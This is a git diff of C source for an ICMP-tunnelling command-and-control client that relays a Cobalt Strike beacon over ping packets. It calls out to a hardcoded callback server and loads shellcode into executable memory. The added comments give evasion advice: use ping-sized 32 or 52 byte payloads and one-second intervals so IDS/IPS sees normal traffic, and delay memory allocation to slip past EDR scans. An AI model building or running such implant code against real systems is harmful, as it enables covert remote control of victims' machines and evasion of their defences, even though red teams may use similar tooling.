@@ -8,41 +8,44 @@
 #include <winsock2.h>
 #include <windows.h>
 
-//Do not touch these. The server is currently setup to only look for 8 & 0 ICMP requests. This may change in the future
-#define ICMP_ECHO       8
-#define ICMP_ECHOREPLY  0
 
+
+///////////////////////////////////////////////////////////////////////
+//// Client Settings
 /*
-Sleep in MS, for each ICMP message back.
+Sleep in MS. How often to send an ICMP message back/checkin to the controller
 
 NOTE - if you set this to something longer than a second, and have a small payload size, it will take a while
-to download your enitre payload.
+to download the initial payload
 
 */
 #define SLEEP_TIME 1000 
 
-// size of payload/data section of ICMP (excluding the 8-byte ICMP header)
-#define ICMP_PAYLOAD_SIZE 1000  // in bytes, 
 /*
 adjust this to set the max payload size per icmp request.
 
 If trying to blend in, use 32 on windows systems. (which is the default payload size of windows `ping` command).
-Note, this will send a SHITLOAD more chunks/ICMP requests in general.
+52 is standard for linux systems, you may be able to get away with that too.
+
+Anything larger may start flagging IDS/IPS for ping of death, or malformed ICMP, etc etc. Expirement around and find out.
+
+Note, smaller payload sizes will send a lot more chunks/ICMP requests in general, so you should find the balance
+between payload size, the amount of ICMP requests sent, and the sleep time.
+
+My best guess/reccomenedation would be 32 or 52 bytes for the payload (standard), and a sleep time of 1000 (1 second), which 
+would look like fairly normal traffic patterns from windows if you did "ping google.com"
 
 Max is 1472, which is the the MTU of 1500 - 20 for IPV4, and 8 for ICMP header
 
 */
+#define ICMP_PAYLOAD_SIZE 1000  // in bytes, 
 
-//Do not touch these either, these are needed for chunk items & size calcs
-#define IPV4_HEADER    20
-#define ICMP_HEADER    8
-#define TAG_SIZE       4
-#define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
 
 //Callback server that the Controller is listenening on
 #define ICMP_CALLBACK_SERVER "172.19.241.197"
 //4 Byte tag that is icnluded in each payload. Change to whatever you want, as long as it's 4 bytes
 #define ICMP_TAG "RQ47"
+
 /*
 Named Pipe to connect your beacon to
 
@@ -54,10 +57,29 @@ ex:
 */
 #define PIPENAME "\\\\.\\pipe\\foobar"
 
+///////////////////////////////////////////////////////////////////////
 
-//Cobalt Strike Settings - Don't touch
+
+//!!Do not touch any of these. They are needed for proper execution.
+#define ICMP_ECHO       8 //The server is currently setup to only look for 8 & 0 ICMP requests. This may change in the future, in which these would be user editable
+#define ICMP_ECHOREPLY  0
+#define IPV4_HEADER    20 //sze of ipv4 header
+#define ICMP_HEADER    8  //size of icmp header
+#define TAG_SIZE       4  //tag size
+#define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
+//Cobalt Strike Settings
 #define PAYLOAD_MAX_SIZE 512 * 1024
 #define BUFFER_MAX_SIZE 1024 * 1024
+///////////////////////////////////////////////////////////////////////
+//Ohkay actual code stuff now:
+
+// Prototypes
+int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
+char* recv_icmp_fragments(SOCKET s);
+char* recv_icmp(SOCKET s);
+DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max);
+void write_frame(HANDLE my_handle, char * buffer, DWORD length);
+int bridge_to_beacon();
 
 struct icmp_header {
     BYTE  Type;
@@ -88,14 +110,6 @@ int received_chunks = 0;
 int total_chunks = 0;
 int received_map[1000]; // track received fragments (max 1000)
 
-// Prototypes
-int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
-char* recv_icmp_fragments(SOCKET s);
-char* recv_icmp(SOCKET s);
-DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max);
-void write_frame(HANDLE my_handle, char * buffer, DWORD length);
-int bridge_to_beacon();
-
 // Reads a “frame” from the given HANDLE by first reading a 4‐byte length, then that many bytes.
 DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
 	DWORD size = 0, temp = 0, total = 0;
@@ -118,7 +132,6 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
 	WriteFile(my_handle, buffer, length, &wrote, NULL);
 }
-
 
 //
 // send_icmp: send a single ICMP Echo Request (Type=8) with a custom sequence.
@@ -424,6 +437,9 @@ int bridge_to_beacon() {
         exit(EXIT_FAILURE);
     }
     unsigned int shellcode_len = (unsigned int)sizeof(shellcode);
+
+    //could do some sneaky stuff here, make it sleep for X seconds before allocating memory to
+    //potentially avoid an EDR mem scan
 
     ///////////////////////////////////////////////////////////////////////
     //// 1) Allocate R/W memory, copy your x64 shellcode, make it executable
